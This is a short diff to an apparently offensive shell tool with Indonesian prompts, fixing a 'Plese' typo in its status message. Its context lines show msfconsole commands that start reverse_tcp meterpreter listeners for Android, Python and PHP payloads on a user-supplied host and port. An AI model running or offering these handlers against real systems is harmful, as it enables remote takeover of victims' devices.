@@ -532,7 +532,7 @@ echo $hi
 sleep 0.01
 read -p "masukan port : " p
 echo
-echo $hi"[+] RUN Plese Wait!!"
+echo $hi"[+] RUN Please Wait!!"
 echo
 msfconsole -x "use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set LHOST $l;set LPORT $p;exploit;"
 clear
@@ -616,7 +616,7 @@ echo $hi
 sleep 0.01
 read -p "masukan port : " p
 echo
-echo $hi"[+] RUN Plese Wait!!"
+echo $hi"[+] RUN Please Wait!!"
 echo
 msfconsole -x "use exploit/multi/handler;set payload python/meterpreter/reverse_tcp;set LHOST $l;set LPORT $p;exploit;"
 clear
@@ -700,7 +700,7 @@ echo $hi
 sleep 0.01
 read -p "masukan port : " p
 echo
-echo $hi"[+] RUN Plese Wait!!"
+echo $hi"[+] RUN Please Wait!!"
 echo
 msfconsole -x "use exploit/multi/handler;set payload php/meterpreter/reverse_tcp;set LHOST $l;set LPORT $p;exploit;"
 clear
